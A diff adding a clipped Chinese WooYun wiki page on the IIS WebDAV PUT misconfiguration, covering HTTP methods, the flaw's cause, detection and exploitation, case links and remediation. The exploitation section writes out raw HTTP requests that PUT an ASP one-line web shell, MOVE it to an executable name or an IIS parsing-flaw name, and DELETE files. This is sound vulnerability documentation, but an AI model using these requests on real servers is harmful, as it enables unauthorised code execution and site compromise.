@@ -1,0 +1,275 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.8 (453748)"/><meta name="created" content="2016-10-19 12:44:13 +0000"/><meta name="source" content="web.clip"/><meta name="source-url" content="http://wiki.wooyun.org/server:httpput"/><meta name="updated" content="2016-10-19 12:44:13 +0000"/><title>server:httpput [WooYun WiKi]</title></head><body><div style="-evernote-webclip:true"><br/><div style="font-size: 16px"><div style="box-sizing:border-box;font-family:sans-serif;text-size-adjust:100%;font-size:10px;-webkit-tap-highlight-color:rgba(0, 0, 0, 0);"><div style="box-sizing:border-box;font-family:&quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:small;line-height:1.42857;color:rgb(51, 51, 51);background:rgb(253, 253, 253);"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;"><span style="box-sizing:border-box;"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;"><div style="box-sizing:border-box;"><span style="display:table;"/>
+
+                                          
+              <div style="box-sizing:border-box;position:fixed;float:right;z-index:1024;top:10px;right:10px;">
+                
+<div style="float:right;box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;border-color:rgb(221, 221, 221);border:1px solid transparent;margin:0px 0px 1.4em 1.4em;width:auto;color:inherit;font-size:0.95em;margin-left:20px;">
+<h3 style="border-bottom:1px solid transparent;box-sizing:border-box;border-top-left-radius:3px;font-weight:bold;color:rgb(51, 51, 51);border-color:rgb(221, 221, 221);background-color:rgb(245, 245, 245);font-family:inherit;line-height:1.1;border-top-right-radius:3px;padding:5px;font-size:0.95em;margin:0px;cursor:pointer;"><i style="box-sizing:border-box;position:relative;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;padding-right:5px;"><span style="font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;"></span></i> <strong style="line-height:1;font-weight:400;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;position:relative;-webkit-font-smoothing:antialiased;box-sizing:border-box;float:right;margin:0px 0.2em;padding-right:5px;"><span style="font-weight:400;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;line-height:1;"></span></strong></h3>
+
+</div>
+
+              </div>
+
+              
+              
+<h1 style="box-sizing:border-box;font-size:36px;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin:40px 0px 20px;padding-bottom:9px;border-bottom:1px solid rgb(238, 238, 238);margin-top:10px;">HTTP请求方法（PUT）</h1>
+<div style="box-sizing:border-box;"
+
+/>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">1、HTTP请求方法简介</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：
+</p>
+<ul style="box-sizing:border-box;margin-top:0px;margin-bottom:10px;">
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">OPTIONS：这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用'*'来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</div>
+</li>
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">HEAD：与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</div>
+</li>
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">GET：向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。参见安全方法</div>
+</li>
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">POST：向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。</div>
+</li>
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">PUT：向指定资源位置上传其最新内容。</div>
+</li>
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">DELETE：请求服务器删除Request-URI所标识的资源。</div>
+</li>
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">TRACE：回显服务器收到的请求，主要用于测试或诊断。</div>
+</li>
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。</div>
+</li>
+</ul>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+IIS实现Webdav是采用的其两种接口CGI、ISAPI的ISAPI接口。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+但因为其没有采用影射的方式，所以IIS的主程序w3svc.dll本身包含了Webdav的信息。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+其识别出是Webdav的请求后就调用Webdav的处理模块httpext.dll。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+对于常见几种请求方法GET、HEAD、POST等，因为常见一些映射都支持。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+所以不能以请求方法作为Webdav请求的判断，w3svc.dll就根据请求头的字段识别。
+如果请求头里面包含Translate:、If:、Lock-Token:中的一种，就认为是Webdav的请求。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+Translate:就是那个Translate:f的泄露源代码的一个请求头，其实设置别的两个也是一样的。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+可能很多IDS是没有这点知识的。W3svc.dll还内置了几个别的请求方法TRACK、TRACE等。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+TRACK就是用于调试错误的，如果收到这样的请求头，w3svc.dll会原样返回请求数据。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+相当于我们常见的ping.exe。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+IIS对TRACK请求没有进行LOG记录，这点我们可以用于来获得banner。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+对于IIS将优于大家习惯使用的HEAD。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+如果上面的请求方法没匹配，那么w3svc.dll就会认为是Webdav的请求，交给httpext.dll处理了。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+这些请求包含Webdav支持的PROPFIND、PROPPATCH、MKCOL、DELETE、PUT、COPY、MOVE、LOCK、UNLOCK等。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">2、漏洞成因</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+web服务器默认是不开启PUT等方法的，出现该漏洞的原因主要是网站管理员对服务器的错误配置。常见的主要就是管理员错误地打开了IIS的服务器的webDAV而且没有开启权限验证，导致可以PUT文件到服务器再利用服务器的解析漏洞运行恶意代码或者用webDAV的MOVE方法将所上传的带有恶意代码的普通文件后缀修改为可执行文件后缀，运行恶意代码。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+若服务器开始了DELETE方法，是可以利用其删除网站上文件的，但是实际案例极少，而且开启了DELETE方法的服务器一般也会开始PUT方法，与PUT方法的危害相比，DELETE方法的危害显然要小得多。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">3、漏洞的检测及利用</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+对服务器发送OPTION包：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">OPTIONS / HTTP/1.1
+Host: www.xxx.com</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+若返回的HTTP响应头中带有PUT、MOVE等方法时则可以确定服务器开启了WebDAV。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+此时用PUT上传一个SHELL，但SHELL后缀不可以是可执行文件后缀。
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">PUT /test.txt HTTP/1.1
+Host: www.xxx.com
+Content-Length: 23
+
+&lt;%eval request("a")%&gt;</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+若服务器启用了“WebDAV”扩展，并且复选了“写入”，就可以写入txt文件了。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+若服务器开启了“脚本资源访问”，可以用MOVE方法将txt后缀文件改成可执行文件的后缀。
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">MOVE /test.txt HTTP/1.1
+Host: www.xxx.com
+Destination: http://www.xxx.com/shell.asp</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+若服务器关闭了“脚本资源访问”，可利用IIS解析漏洞来执行shell。
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">MOVE /test.txt HTTP/1.1
+Host: www.xxx.com
+Destination: http://www.xxx.com/test.asp;.jpg</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+若服务器开启了DELETE方法，可以使用以下HTTP请求删除制定文件。
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">DELETE /test.txt HTTP/1.1
+Host: www.xxx.com</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+你也可以使用以下的开源DAV管理工具：
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://www.davexplorer.org/installation.html" title="http://www.davexplorer.org/installation.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">DAV Explorer</a>
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">4、实际案例</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://www.wooyun.org/bugs/wooyun-2010-032273" title="http://www.wooyun.org/bugs/wooyun-2010-032273" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">15个gov edu的IISPUT漏洞合集</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://www.wooyun.org/bugs/wooyun-2015-0101152" title="http://www.wooyun.org/bugs/wooyun-2015-0101152" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">海康威视某通用系统配置不当可PUT文件</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://www.wooyun.org/bugs/wooyun-2015-097612" title="http://www.wooyun.org/bugs/wooyun-2015-097612" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">某市红十字会由于iis配置不当导致put任意文件上传</a>
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">5、漏洞修复</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">禁用WebDAV</strong>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+通常情况下网站不需要支持额外的方法，右键WebDAV，点击禁用即可。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">如果要使用WebDAV的话，加上权限验证</strong>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+如果选取“脚本资源访问”，则用户将具备修改WebADV文件夹内的脚本文说明件(scriptfile)的功能。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+除了此处的虚拟目录权限外，还需要视NTFS权限，才可以决定用户是否有权限来访问WebDAV文件夹内的文件。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+WebDAV文件夹的NTFS权限给予用户适当的NTFS权限。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+首先请设置让Everyone组只有“读取”的权限，然后再针对个别用户给予“写入”的权限，例如我们给予用户“User”写入的权限。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+选择验证用户身份的方法启动“IIS管理器”，然后右击WebDAV虚拟目录，选择“属性”→“目录安全性”，单击“身份验证和访问控制”处的编辑按钮。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+不要选取“启用匿名访问”，以免招致攻击。选择安全的验证方法，选择“集成Windows身份验证”。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">6、相关资源</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE" title="http://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">超文本传输协议</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://zh.wikipedia.org/wiki/WebDAV" title="http://zh.wikipedia.org/wiki/WebDAV" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">WebDAV</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://drops.wooyun.org/papers/238" title="http://drops.wooyun.org/papers/238" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">IIS WebDAV安全配置</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://hi.baidu.com/yuange1975/item/a836d31096b5b959f1090e89" title="http://hi.baidu.com/yuange1975/item/a836d31096b5b959f1090e89" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">IIS的Webdav简单介绍</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://www.daxigua.com/archives/1597" title="http://www.daxigua.com/archives/1597" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">远程分析IIS设置</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://www.daxigua.com/archives/2750" title="http://www.daxigua.com/archives/2750" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">小议IIS的特殊权限</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184924/http://www.daxigua.com/archives/2747" title="http://www.daxigua.com/archives/2747" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">IIS可以PUT，但无法MOVE的原因</a>
+</p>
+
+</div>
+
+              
+
+                            
+            <span style="display:table;clear:both;"/></div></div></div></span></div></div></div></div></div><br/></div></body></html>
